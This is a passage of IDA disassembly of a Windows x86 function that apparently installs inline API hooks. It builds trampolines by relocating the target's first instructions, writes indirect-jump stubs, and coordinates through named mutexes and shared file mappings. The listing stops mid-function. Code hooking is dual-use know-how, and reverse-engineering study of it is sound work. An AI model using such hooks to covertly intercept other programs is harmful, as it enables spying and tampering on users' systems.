var_11C		= dword	ptr -11Ch
var_118		= dword	ptr -118h
var_114		= dword	ptr -114h
var_110		= dword	ptr -110h
var_10C		= dword	ptr -10Ch
lpModuleName	= dword	ptr -108h
var_104		= dword	ptr -104h
var_100		= dword	ptr -100h
var_FC		= dword	ptr -0FCh
var_F8		= dword	ptr -0F8h
var_F4		= dword	ptr -0F4h
var_F0		= dword	ptr -0F0h
var_EC		= dword	ptr -0ECh
var_E8		= dword	ptr -0E8h
var_E4		= byte ptr -0E4h
var_D8		= dword	ptr -0D8h
var_A4		= byte ptr -0A4h
var_9C		= dword	ptr -9Ch
var_98		= dword	ptr -98h
var_84		= dword	ptr -84h
var_7C		= byte ptr -7Ch
var_64		= byte ptr -64h
var_62		= word ptr -62h
var_5D		= byte ptr -5Dh
var_5C		= dword	ptr -5Ch
var_50		= dword	ptr -50h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
dwErrCode	= dword	ptr -38h
var_34		= dword	ptr -34h
lpAddress	= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
lpBaseAddress	= dword	ptr -18h
hObject		= dword	ptr -14h
var_10		= dword	ptr -10h
hMutex		= dword	ptr -0Ch
var_5		= byte ptr -5
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	ecx, 23h

loc_40F0AD:				; CODE XREF: sub_40F0A4+Ej
		push	0
		push	0
		dec	ecx
		jnz	short loc_40F0AD
		push	ecx
		xchg	ecx, [ebp+var_4]
		push	ebx
		push	esi
		push	edi
		test	dl, dl
		jz	short loc_40F0C7
		add	esp, 0FFFFFFF0h
		call	sub_402E40

loc_40F0C7:				; CODE XREF: sub_40F0A4+19j
		mov	ebx, ecx
		mov	[ebp+var_5], dl
		mov	[ebp+var_4], eax
		mov	edi, [ebp+arg_4]
		mov	eax, [ebp+arg_10]
		call	sub_403E14
		lea	eax, [ebp+var_A4]
		mov	edx, off_407188
		call	sub_403FD8
		xor	eax, eax
		push	ebp
		push	offset loc_40FF99
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	eax, eax
		mov	[ebp+dwErrCode], eax
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax+20h], edx
		call	sub_40D148
		push	ebp
		push	offset loc_40FF49
		push	large dword ptr	fs:0
		mov	large fs:0, esp
		call	sub_40A920
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40F13F
		mov	edx, offset dword_416A54
		mov	eax, offset dword_416A50
		call	sub_40A6B0

loc_40F13F:				; CODE XREF: sub_40F0A4+8Aj
		xor	eax, eax
		mov	[edi], eax
		mov	eax, [ebp+var_4]
		mov	[eax+30h], ebx
		mov	eax, [ebp+var_4]
		xor	edx, edx
		mov	[eax+28h], edx
		lea	edx, [ebp+var_E4]
		mov	eax, offset dword_40E8F0
		call	sub_4097C0
		mov	eax, [ebp+var_D8]
		mov	[ebp+var_3C], eax
		mov	eax, [ebp+var_3C]
		add	eax, 0F5Ah
		call	sub_40CA74
		mov	esi, eax
		mov	eax, [ebp+var_4]
		mov	[eax+20h], esi
		mov	byte ptr [esi],	0FFh
		mov	byte ptr [esi+1], 25h
		lea	eax, [esi+6]
		mov	[esi+2], eax
		mov	edx, [ebp+var_4]
		mov	eax, [ebp+arg_C]
		mov	[edx+8], eax
		mov	[ebp+var_34], eax
		mov	eax, [ebp+var_4]
		mov	edx, [ebp+arg_8]
		mov	[eax+10h], edx
		mov	eax, [ebp+var_4]
		mov	[eax+14h], edi
		lea	eax, [ebp+var_1C]
		push	eax
		mov	eax, [ebp+var_4]
		mov	edx, [eax+8]
		xor	ecx, ecx
		mov	eax, offset dword_40FFCC
		call	sub_40C5F8
		lea	eax, [ebp+var_20]
		push	eax
		mov	eax, [ebp+var_4]
		mov	edx, [eax+8]
		mov	eax, offset dword_40FFCC
		mov	cl, 1
		call	sub_40C5F8
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40F200
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax+8], 80000000h
		jb	short loc_40F208
		lea	eax, [ebp+var_1C]
		mov	edx, [ebp+var_20]
		call	sub_403A2C
		lea	eax, [ebp+var_20]
		call	sub_403994
		jmp	short loc_40F208
; ---------------------------------------------------------------------------

loc_40F200:				; CODE XREF: sub_40F0A4+139j
		lea	eax, [ebp+var_20]
		call	sub_403994

loc_40F208:				; CODE XREF: sub_40F0A4+145j
					; sub_40F0A4+15Aj
		lea	edx, [ebp+var_EC]
		mov	eax, offset dword_40FFD8
		call	sub_4064CC
		push	[ebp+var_EC]
		push	offset dword_40FFE8
		push	[ebp+var_1C]
		lea	eax, [ebp+var_E8]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_E8]
		call	sub_403E24
		push	eax		; lpName
		call	sub_40C210
		mov	[ebp+hMutex], eax
		cmp	[ebp+var_20], 0
		jz	short loc_40F294
		lea	edx, [ebp+var_F4]
		mov	eax, offset dword_40FFD8
		call	sub_4064CC
		push	[ebp+var_F4]
		push	offset dword_40FFE8
		push	[ebp+var_20]
		lea	eax, [ebp+var_F0]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_F0]
		call	sub_403E24
		push	eax		; lpName
		call	sub_40C210
		mov	[ebp+var_10], eax
		jmp	short loc_40F299
; ---------------------------------------------------------------------------

loc_40F294:				; CODE XREF: sub_40F0A4+1AAj
		xor	eax, eax
		mov	[ebp+var_10], eax

loc_40F299:				; CODE XREF: sub_40F0A4+1EEj
		push	ebp
		push	offset loc_40FF26
		push	large dword ptr	fs:0
		mov	large fs:0, esp
		cmp	[ebp+hMutex], 0
		jz	short loc_40F2BE
		push	0FFFFFFFFh	; dwMilliseconds
		mov	eax, [ebp+hMutex]
		push	eax		; hHandle
		call	WaitForSingleObject

loc_40F2BE:				; CODE XREF: sub_40F0A4+20Dj
		cmp	[ebp+var_10], 0
		jz	short loc_40F2CF
		push	0FFFFFFFFh	; dwMilliseconds
		mov	eax, [ebp+var_10]
		push	eax		; hHandle
		call	WaitForSingleObject

loc_40F2CF:				; CODE XREF: sub_40F0A4+21Ej
		push	ebp
		push	offset loc_40FEF3
		push	large dword ptr	fs:0
		mov	large fs:0, esp
		push	0FFFFFFFFh
		lea	edx, [ebp+var_FC]
		mov	eax, offset dword_40FFF4
		call	sub_4064CC
		push	[ebp+var_FC]
		push	offset dword_40FFE8
		push	[ebp+var_1C]
		lea	eax, [ebp+var_F8]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_F8]
		call	sub_403E24
		push	eax
		call	sub_40C508
		mov	[ebp+hObject], eax
		lea	eax, [ebp+hObject]
		call	sub_40F054
		xor	al, 1
		mov	edx, [ebp+var_4]
		mov	[edx+5], al
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+5], 0
		jz	short loc_40F3AE
		cmp	[ebp+var_20], 0
		jz	short loc_40F3AE
		push	0FFFFFFFFh
		lea	edx, [ebp+var_104]
		mov	eax, offset dword_40FFF4
		call	sub_4064CC
		push	[ebp+var_104]
		push	offset dword_40FFE8
		push	[ebp+var_20]
		lea	eax, [ebp+var_100]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_100]
		call	sub_403E24
		push	eax
		call	sub_40C508
		mov	[ebp+hObject], eax
		lea	eax, [ebp+hObject]
		call	sub_40F054
		xor	al, 1
		mov	edx, [ebp+var_4]
		mov	[edx+5], al
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+5], 0
		jnz	short loc_40F3AE
		lea	eax, [ebp+var_1C]
		mov	edx, [ebp+var_20]
		call	sub_403A2C

loc_40F3AE:				; CODE XREF: sub_40F0A4+29Aj
					; sub_40F0A4+2A0j ...
		push	ebp
		push	offset loc_40FEC0
		push	large dword ptr	fs:0
		mov	large fs:0, esp
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+5], 0
		jz	loc_40F77F
		mov	eax, [ebp+var_4]
		mov	ecx, [eax+8]
		mov	edx, [ebp+arg_10]
		mov	eax, ebx
		call	sub_40EE2C
		test	al, al
		jz	short loc_40F403
		mov	[ebp+dwErrCode], 770001h
		call	sub_403418
		call	sub_403418
		call	sub_403418
		call	sub_403418
		jmp	loc_40FF50
; ---------------------------------------------------------------------------

loc_40F403:				; CODE XREF: sub_40F0A4+33Dj
		test	byte ptr [ebp+arg_0], 2
		jnz	short loc_40F444
		mov	eax, [ebp+var_4]
		mov	edx, [eax+8]
		mov	eax, ebx
		call	sub_40ED30
		test	al, al
		jnz	short loc_40F440
		lea	edx, [ebp+var_A4]
		mov	eax, [ebp+var_4]
		mov	eax, [eax+8]
		call	sub_4097C0
		cmp	[ebp+var_A4], 0
		jz	short loc_40F43A
		cmp	[ebp+var_7C], 0
		jnz	short loc_40F444

loc_40F43A:				; CODE XREF: sub_40F0A4+38Ej
		or	[ebp+arg_0], 2
		jmp	short loc_40F444
; ---------------------------------------------------------------------------

loc_40F440:				; CODE XREF: sub_40F0A4+374j
		or	[ebp+arg_0], 2

loc_40F444:				; CODE XREF: sub_40F0A4+363j
					; sub_40F0A4+394j ...
		test	byte ptr [ebp+arg_0], 2
		jnz	short loc_40F484
		mov	eax, [ebp+var_4]
		mov	edx, [eax+8]
		mov	eax, ebx
		call	sub_40EFD8
		mov	edx, [ebp+var_4]
		mov	[edx+0Ch], al
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	loc_40F78F
		cmp	[ebp+var_20], 0
		jz	loc_40F78F
		lea	eax, [ebp+var_1C]
		mov	edx, [ebp+var_20]
		call	sub_403A2C
		jmp	loc_40F78F
; ---------------------------------------------------------------------------

loc_40F484:				; CODE XREF: sub_40F0A4+3A4j
		test	byte ptr [ebp+arg_0], 10h
		jnz	loc_40F75F
		test	ebx, ebx
		jz	short loc_40F4F1
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_40F4D1
		lea	edx, [ebp+var_10C]
		mov	eax, offset dword_410008
		call	sub_4064CC
		mov	eax, [ebp+var_10C]
		lea	ecx, [ebp+lpModuleName]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+lpModuleName]
		push	eax		; lpModuleName
		call	GetModuleHandleW
		mov	edi, eax
		jmp	short loc_40F4F3
; ---------------------------------------------------------------------------

loc_40F4D1:				; CODE XREF: sub_40F0A4+3F8j
		mov	eax, offset dword_410008
		lea	edx, [ebp+var_110]
		call	sub_4064CC
		mov	eax, [ebp+var_110]
		push	eax		; lpModuleName
		call	GetModuleHandleA_0_0
		mov	edi, eax
		jmp	short loc_40F4F3
; ---------------------------------------------------------------------------

loc_40F4F1:				; CODE XREF: sub_40F0A4+3ECj
		xor	edi, edi

loc_40F4F3:				; CODE XREF: sub_40F0A4+42Bj
					; sub_40F0A4+44Bj
		cmp	ebx, edi
		jz	loc_40F73F
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40F52B
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax+8], 80000000h
		jnb	short loc_40F52F
		test	ebx, ebx
		jz	short loc_40F52B
		mov	eax, ebx
		call	sub_406854
		mov	edx, eax
		mov	eax, ebx
		call	sub_40EFD8
		test	al, al
		jnz	short loc_40F52F

loc_40F52B:				; CODE XREF: sub_40F0A4+461j
					; sub_40F0A4+471j
		xor	eax, eax
		jmp	short loc_40F531
; ---------------------------------------------------------------------------

loc_40F52F:				; CODE XREF: sub_40F0A4+46Dj
					; sub_40F0A4+485j
		mov	al, 1

loc_40F531:				; CODE XREF: sub_40F0A4+489j
		mov	edx, [ebp+var_4]
		mov	[edx+0Ch], al
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40F55F
		cmp	[ebp+var_20], 0
		jz	short loc_40F551
		lea	eax, [ebp+var_1C]
		mov	edx, [ebp+var_20]
		call	sub_403A2C

loc_40F551:				; CODE XREF: sub_40F0A4+4A0j
		push	0
		push	0Ah
		call	sub_40A770
		mov	[ebp+lpAddress], eax
		jmp	short loc_40F56C
; ---------------------------------------------------------------------------

loc_40F55F:				; CODE XREF: sub_40F0A4+49Aj
		mov	eax, 0Ah
		call	sub_40CA74
		mov	[ebp+lpAddress], eax

loc_40F56C:				; CODE XREF: sub_40F0A4+4B9j
		mov	eax, [ebp+lpAddress]
		mov	byte ptr [eax],	0FFh
		mov	eax, [ebp+lpAddress]
		mov	byte ptr [eax+1], 25h
		mov	eax, [ebp+lpAddress]
		add	eax, 6
		mov	edx, [ebp+lpAddress]
		mov	[edx+2], eax
		mov	eax, [ebp+var_4]
		mov	eax, [eax+8]
		mov	edx, [ebp+lpAddress]
		mov	[edx+6], eax
		lea	eax, [ebp+var_24]
		push	eax
		mov	eax, [ebp+var_4]
		mov	cl, [eax+0Ch]
		mov	edx, [ebp+lpAddress]
		mov	eax, offset dword_41001C
		call	sub_40C5F8
		push	4		; dwMaximumSizeLow
		lea	edx, [ebp+var_118]
		mov	eax, offset dword_40FFF4
		call	sub_4064CC
		push	[ebp+var_118]
		push	offset dword_40FFE8
		push	[ebp+var_24]
		lea	eax, [ebp+var_114]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_114]
		call	sub_403E24
		push	eax		; int
		call	sub_40C3F4
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	short loc_40F633
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	short loc_40F625
		mov	eax, [ebp+var_4]
		mov	eax, [eax+8]
		mov	edx, [ebp+lpBaseAddress]
		mov	[edx], eax
		mov	eax, [ebp+lpBaseAddress]
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile
		jmp	short loc_40F633
; ---------------------------------------------------------------------------

loc_40F625:				; CODE XREF: sub_40F0A4+569j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle
		xor	eax, eax
		mov	[ebp+hObject], eax

loc_40F633:				; CODE XREF: sub_40F0A4+54Cj
					; sub_40F0A4+57Fj
		cmp	[ebp+hObject], 0
		jz	loc_40F6EA
		mov	eax, [ebp+var_4]
		mov	edx, [eax+8]
		mov	ecx, [ebp+lpAddress]
		mov	eax, ebx
		call	sub_40CB00
		test	al, al
		jnz	short loc_40F66E
		call	sub_40CCFC
		mov	edx, [ebp+var_4]
		cmp	eax, [edx+8]
		jnz	loc_40F6EA
		mov	eax, [ebp+lpAddress]
		call	sub_40CD20
		test	al, al
		jz	short loc_40F6EA

loc_40F66E:				; CODE XREF: sub_40F0A4+5ABj
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40F6AF
		mov	eax, [ebp+hObject]
		call	sub_40A660
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle
		call	sub_40CCFC
		mov	edx, [ebp+var_4]
		cmp	eax, [edx+8]
		jz	short loc_40F6AF
		mov	eax, [ebp+var_4]
		mov	eax, [eax+8]
		mov	edx, [ebp+lpAddress]
		call	sub_40CD78
		test	byte ptr [ebp+arg_0], 4
		setnz	al
		call	sub_40D194

loc_40F6AF:				; CODE XREF: sub_40F0A4+5D1j
					; sub_40F0A4+5EFj
		xor	eax, eax
		push	ebp
		push	offset loc_40F6D5
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+var_4]
		mov	eax, [eax+8]
		mov	edx, [ebp+lpAddress]
		call	sub_40CCD4
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_40F6DF
; ---------------------------------------------------------------------------

loc_40F6D5:				; DATA XREF: sub_40F0A4+60Eo
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_40F6DF:				; CODE XREF: sub_40F0A4+62Fj
		mov	eax, [ebp+lpAddress]
		mov	[ebp+var_34], eax
		jmp	loc_40F78F
; ---------------------------------------------------------------------------

loc_40F6EA:				; CODE XREF: sub_40F0A4+593j
					; sub_40F0A4+5B8j ...
		cmp	[ebp+hObject], 0
		jz	short loc_40F6F9
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40F6F9:				; CODE XREF: sub_40F0A4+64Aj
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40F70F
		push	0
		mov	eax, [ebp+lpAddress]
		push	eax
		call	sub_40A890
		jmp	short loc_40F71F
; ---------------------------------------------------------------------------

loc_40F70F:				; CODE XREF: sub_40F0A4+65Cj
		push	8000h		; dwFreeType
		push	0		; dwSize
		mov	eax, [ebp+lpAddress]
		push	eax		; lpAddress
		call	VirtualFree_0

loc_40F71F:				; CODE XREF: sub_40F0A4+669j
		mov	[ebp+dwErrCode], 770002h
		call	sub_403418
		call	sub_403418
		call	sub_403418
		call	sub_403418
		jmp	loc_40FF50
; ---------------------------------------------------------------------------

loc_40F73F:				; CODE XREF: sub_40F0A4+451j
		mov	[ebp+dwErrCode], 770002h
		call	sub_403418
		call	sub_403418
		call	sub_403418
		call	sub_403418
		jmp	loc_40FF50
; ---------------------------------------------------------------------------

loc_40F75F:				; CODE XREF: sub_40F0A4+3E4j
		mov	[ebp+dwErrCode], 770002h
		call	sub_403418
		call	sub_403418
		call	sub_403418
		call	sub_403418
		jmp	loc_40FF50
; ---------------------------------------------------------------------------

loc_40F77F:				; CODE XREF: sub_40F0A4+325j
		mov	eax, [ebp+var_1C]
		cmp	byte ptr [eax+5], 53h
		setz	al
		mov	edx, [ebp+var_4]
		mov	[edx+0Ch], al

loc_40F78F:				; CODE XREF: sub_40F0A4+3C0j
					; sub_40F0A4+3CAj ...
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40F79E
		test	byte ptr [ebp+arg_0], 4
		jnz	short loc_40F7A2

loc_40F79E:				; CODE XREF: sub_40F0A4+6F2j
		xor	eax, eax
		jmp	short loc_40F7A4
; ---------------------------------------------------------------------------

loc_40F7A2:				; CODE XREF: sub_40F0A4+6F8j
		mov	al, 1

loc_40F7A4:				; CODE XREF: sub_40F0A4+6FCj
		mov	edx, [ebp+var_4]
		mov	[edx+24h], al
		test	al, al
		jz	loc_40F977
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax+10h], 80000000h
		jnb	loc_40F8CA
		mov	eax, [ebp+var_4]
		add	eax, 18h
		push	eax
		lea	eax, [ebp+var_A4]
		push	eax
		test	byte ptr [ebp+arg_0], 8
		setnz	cl
		mov	eax, [ebp+var_4]
		mov	eax, [eax+10h]
		xor	edx, edx
		call	sub_40AB44
		mov	edx, [ebp+var_4]
		mov	[edx+10h], eax
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax+10h], 0
		jnz	short loc_40F813
		mov	[ebp+dwErrCode], 770003h
		call	sub_403418
		call	sub_403418
		call	sub_403418
		call	sub_403418
		jmp	loc_40FF50
; ---------------------------------------------------------------------------

loc_40F813:				; CODE XREF: sub_40F0A4+74Dj
		mov	eax, [ebp+var_84]
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	loc_40F8B0
		inc	esi
		xor	ebx, ebx

loc_40F82B:				; CODE XREF: sub_40F0A4+806j
		mov	eax, ebx
		shl	eax, 3
		sub	eax, ebx
		mov	edx, [ebp+var_84]
		lea	ecx, [edx+eax*4]
		cmp	byte ptr [ecx+10h], 0
		jnz	short loc_40F8A8
		cmp	dword ptr [ecx+18h], 0
		jz	short loc_40F8A8
		mov	eax, [ecx+18h]
		mov	eax, [eax]
		mov	edx, [ebp+var_4]
		cmp	eax, [edx+14h]
		jnz	short loc_40F8A8
		mov	eax, [ecx+18h]
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, [ebp+var_9C]
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, [ebp+var_4]
		mov	eax, [eax+18h]
		xor	edx, edx
		sub	[esp+188h+var_188], eax
		sbb	[esp+188h+var_184], edx
		pop	eax
		pop	edx
		sub	[esp+180h+var_180], eax
		sbb	[esp+180h+var_17C], edx
		pop	eax
		pop	edx
		mov	edi, eax
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+24h], 0
		jnz	short loc_40F89A
		mov	edx, 4
		mov	eax, edi
		call	sub_40AAAC
		test	al, al
		jz	short loc_40F8A8

loc_40F89A:				; CODE XREF: sub_40F0A4+7E4j
		mov	eax, [ebp+var_4]
		mov	eax, [eax+18h]
		add	eax, [ebp+var_98]
		mov	[edi], eax

loc_40F8A8:				; CODE XREF: sub_40F0A4+79Bj
					; sub_40F0A4+7A1j ...
		inc	ebx
		dec	esi
		jnz	loc_40F82B

loc_40F8B0:				; CODE XREF: sub_40F0A4+77Ej
		mov	eax, [ebp+var_4]
		mov	eax, [eax+18h]
		add	eax, [ebp+var_98]
		mov	edx, [ebp+var_4]
		mov	edx, [edx+20h]
		mov	[edx+2], eax
		jmp	loc_40F977
; ---------------------------------------------------------------------------

loc_40F8CA:				; CODE XREF: sub_40F0A4+718j
		lea	edx, [ebp+var_A4]
		mov	eax, [ebp+var_4]
		mov	eax, [eax+10h]
		call	sub_4097C0
		cmp	[ebp+var_A4], 0
		jnz	short loc_40F904
		mov	[ebp+dwErrCode], 770003h
		call	sub_403418
		call	sub_403418
		call	sub_403418
		call	sub_403418
		jmp	loc_40FF50
; ---------------------------------------------------------------------------

loc_40F904:				; CODE XREF: sub_40F0A4+83Ej
		mov	eax, [ebp+var_84]
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	short loc_40F977
		inc	esi
		xor	ebx, ebx

loc_40F918:				; CODE XREF: sub_40F0A4+8D1j
		mov	eax, ebx
		shl	eax, 3
		sub	eax, ebx
		mov	edx, [ebp+var_84]
		lea	edi, [edx+eax*4]
		cmp	byte ptr [edi+10h], 0
		jnz	short loc_40F973
		cmp	dword ptr [edi+18h], 0
		jz	short loc_40F973
		mov	eax, [edi+18h]
		mov	eax, [eax]
		mov	edx, [ebp+var_4]
		cmp	eax, [edx+14h]
		jnz	short loc_40F973
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax+18h], 0
		jnz	short loc_40F968
		push	0
		push	4
		call	sub_40A770
		mov	edx, [ebp+var_4]
		mov	[edx+18h], eax
		mov	eax, [ebp+var_4]
		mov	eax, [eax+18h]
		mov	edx, [ebp+var_4]
		mov	edx, [edx+20h]
		mov	[edx+2], eax

loc_40F968:				; CODE XREF: sub_40F0A4+8A4j
		mov	eax, [ebp+var_4]
		mov	eax, [eax+18h]
		mov	edx, [edi+18h]
		mov	[edx], eax

loc_40F973:				; CODE XREF: sub_40F0A4+888j
					; sub_40F0A4+88Ej ...
		inc	ebx
		dec	esi
		jnz	short loc_40F918

loc_40F977:				; CODE XREF: sub_40F0A4+708j
					; sub_40F0A4+821j ...
		xor	eax, eax
		mov	[ebp+lpBaseAddress], eax
		xor	ecx, ecx
		push	ebp
		push	offset loc_40FE8A
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+5], 0
		jz	loc_40FBAC
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40F9AE
		push	0
		push	22h
		call	sub_40A770
		mov	[ebp+var_2C], eax
		jmp	short loc_40F9D5
; ---------------------------------------------------------------------------

loc_40F9AE:				; CODE XREF: sub_40F0A4+8FAj
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40F9C8
		push	22h		; uBytes
		push	40h		; uFlags
		call	LocalAlloc_1
		mov	[ebp+var_2C], eax
		jmp	short loc_40F9D5
; ---------------------------------------------------------------------------

loc_40F9C8:				; CODE XREF: sub_40F0A4+914j
		mov	eax, 22h
		call	sub_40CA74
		mov	[ebp+var_2C], eax

loc_40F9D5:				; CODE XREF: sub_40F0A4+908j
					; sub_40F0A4+922j
		mov	ebx, [ebp+var_34]
		mov	esi, [ebp+var_2C]

loc_40F9DB:				; CODE XREF: sub_40F0A4+9CDj
		lea	edx, [ebp+var_64]
		mov	eax, ebx
		call	sub_408610
		cmp	[ebp+var_5D], 0
		jz	short loc_40FA54
		cmp	[ebp+var_50], 1
		jnz	short loc_40FA13
		cmp	[ebp+var_62], 0EBh
		jz	short loc_40FA0B
		mov	byte ptr [esi],	0Fh
		mov	al, byte ptr [ebp+var_62]
		and	al, 0Fh
		add	al, 80h
		mov	[esi+1], al
		add	esi, 6
		jmp	short loc_40FA46
; ---------------------------------------------------------------------------

loc_40FA0B:				; CODE XREF: sub_40F0A4+953j
		mov	byte ptr [esi],	0E9h
		add	esi, 5
		jmp	short loc_40FA46
; ---------------------------------------------------------------------------

loc_40FA13:				; CODE XREF: sub_40F0A4+94Bj
		cmp	[ebp+var_50], 2
		jnz	short loc_40FA34
		mov	edi, [ebp+var_44]
		sub	edi, ebx
		mov	ecx, edi
		sub	ecx, 3
		mov	edx, esi
		mov	eax, ebx
		inc	eax
		call	sub_402664
		add	edi, esi
		inc	edi
		mov	esi, edi
		jmp	short loc_40FA46
; ---------------------------------------------------------------------------

loc_40FA34:				; CODE XREF: sub_40F0A4+973j
		mov	edi, [ebp+var_44]
		sub	edi, ebx
		mov	edx, esi
		mov	eax, ebx
		mov	ecx, edi
		call	sub_402664
		add	esi, edi

loc_40FA46:				; CODE XREF: sub_40F0A4+965j
					; sub_40F0A4+96Dj ...
		mov	edx, [ebp+var_5C]
		mov	eax, esi
		sub	edx, eax
		sub	eax, 4
		mov	[eax], edx
		jmp	short loc_40FA66
; ---------------------------------------------------------------------------

loc_40FA54:				; CODE XREF: sub_40F0A4+945j
		mov	edi, [ebp+var_44]
		sub	edi, ebx
		mov	edx, esi
		mov	eax, ebx
		mov	ecx, edi
		call	sub_402664
		add	esi, edi

loc_40FA66:				; CODE XREF: sub_40F0A4+9AEj
		mov	ebx, [ebp+var_44]
		mov	eax, ebx
		sub	eax, [ebp+var_34]
		cmp	eax, 6
		jb	loc_40F9DB
		mov	byte ptr [esi],	0E9h
		add	esi, 5
		sub	ebx, esi
		sub	esi, 4
		mov	[esi], ebx
		push	4		; dwMaximumSizeLow
		lea	edx, [ebp+var_120]
		mov	eax, offset dword_40FFF4
		call	sub_4064CC
		push	[ebp+var_120]
		push	offset dword_40FFE8
		push	[ebp+var_1C]
		lea	eax, [ebp+var_11C]
		mov	edx, 3
		call	sub_403CE4
		mov	eax, [ebp+var_11C]
		call	sub_403E24
		push	eax		; int
		call	sub_40C3F4
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	loc_40FC74
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40FAE3
		mov	eax, [ebp+hObject]
		call	sub_40A660

loc_40FAE3:				; CODE XREF: sub_40F0A4+A35j
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	loc_40FC74
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax+0Ch], 0
		jz	short loc_40FB1D
		push	0
		push	5Ch
		call	sub_40A770
		mov	edx, [ebp+lpBaseAddress]
		mov	[edx], eax
		jmp	short loc_40FB2C
; ---------------------------------------------------------------------------

loc_40FB1D:				; CODE XREF: sub_40F0A4+A67j
		mov	eax, 5Ch
		call	sub_40CA74
		mov	edx, [ebp+lpBaseAddress]
		mov	[edx], eax

loc_40FB2C:				; CODE XREF: sub_40F0A4+A77j
		mov	eax, [ebp+lpBaseAddress]
		mov	eax, [eax]
		mov	dword ptr [eax], 2
		mov	dword ptr [eax+4], 8
		mov	edx, [ebp+var_34]
		mov	[eax+0Ch], edx
		mov	edx, [eax+0Ch]
		mov	ecx, [edx]
		mov	[eax+10h], ecx
		mov	cx, [edx+4]
		mov	[eax+14h], cx
		mov	byte ptr [eax+16h], 0FFh
		mov	byte ptr [eax+17h], 25h
		mov	edx, [ebp+var_2C]
		add	edx, 1Eh
		mov	[eax+18h], edx
		mov	edx, [eax+18h]
		mov	ecx, [ebp+var_2C]
		mov	[edx], ecx
		mov	edx, [ebp+var_4]
		cmp	byte ptr [edx+0Ch], 0
		jnz	short loc_40FB89
		mov	edx, [ebp+var_4]
		mov	edx, [edx+8]
		cmp	edx, [eax+0Ch]
		jnz	short loc_40FB89
		mov	edx, [ebp+hObject]
		mov	[eax+8], edx
		jmp	short loc_40FB8E
; ---------------------------------------------------------------------------

loc_40FB89:				; CODE XREF: sub_40F0A4+AD0j
					; sub_40F0A4+ADBj
		xor	edx, edx
		mov	[eax+8], edx

loc_40FB8E:				; CODE XREF: sub_40F0A4+AE3j
		xor	edx, edx
		mov	[eax+1Ch], edx
		mov	edx, [ebp+var_2C]
		add	edx, 1Eh
		mov	[eax+20h], edx
		mov	edx, [ebp+var_2C]
		mov	[eax+24h], edx
		xor	edx, edx
		mov	[eax+28h], edx
		jmp	loc_40FC74
; ---------------------------------------------------------------------------

loc_40FBAC:				; CODE XREF: sub_40F0A4+8EDj
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
